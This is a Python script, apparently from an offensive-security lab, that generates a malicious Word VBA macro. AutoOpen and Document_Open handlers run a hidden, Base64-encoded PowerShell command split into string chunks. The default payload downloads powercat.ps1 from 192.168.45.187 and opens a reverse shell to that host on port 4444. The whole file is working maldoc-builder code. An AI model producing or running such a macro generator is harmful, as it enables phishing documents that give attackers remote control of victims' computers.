import base64

def string_to_base64_powershell(input_string):
    """
    Convert a string to Base64 using PowerShell's encoding method (UTF-16LE).
    
    Parameters:
        input_string (str): The string to encode.

    Returns:
        str: The Base64-encoded string.
    """
    # Encode the input string to bytes using UTF-16LE encoding
    utf16_bytes = input_string.encode('utf-16le')
    # Convert bytes to Base64
    base64_bytes = base64.b64encode(utf16_bytes)
    # Convert Base64 bytes to string
    base64_string = base64_bytes.decode('utf-8')
    return base64_string

def format_string(base64_str, chunk_size=50):
    """
    Format the Base64 string into PowerShell concatenation syntax.
    
    Parameters:
        base64_str (str): The Base64-encoded string.
        chunk_size (int): The size of each chunk for VBA string concatenation.

    Returns:
        str: The formatted string with VBA concatenation.
    """
    formatted_str = ""
    for i in range(0, len(base64_str), chunk_size):
        chunk = base64_str[i:i+chunk_size]
        formatted_str += f'Str = Str + "{chunk}"\n'
    return formatted_str.strip()

def generate_vba_macro(input_string):
    """
    Generate the VBA macro script with the encoded PowerShell command.
    
    Parameters:
        input_string (str): The string to encode and include in the VBA macro.

    Returns:
        str: The complete VBA macro script.
    """
    base64_str = string_to_base64_powershell(input_string)
    ps_command = f"powershell.exe -nop -w hidden -enc {base64_str}"
    formatted_str = format_string(ps_command)
    
    vba_macro = f"""
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    {formatted_str}
    CreateObject("Wscript.Shell").Run Str
End Sub
"""
    return vba_macro.strip()

def main():
    """
    Main function to execute the script.
    
    Instructions:
    1. Modify the 'input_string' variable with the command you want to encode.
    2. Run the script to print the VBA macro.
    3. Copy the output and paste it into your VBA environment.
    """
    input_string = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.187/powercat.ps1');powercat -c 192.168.45.187 -p 4444 -e powershell"
    vba_macro = generate_vba_macro(input_string)
    print(vba_macro)

if __name__ == "__main__":
    main()
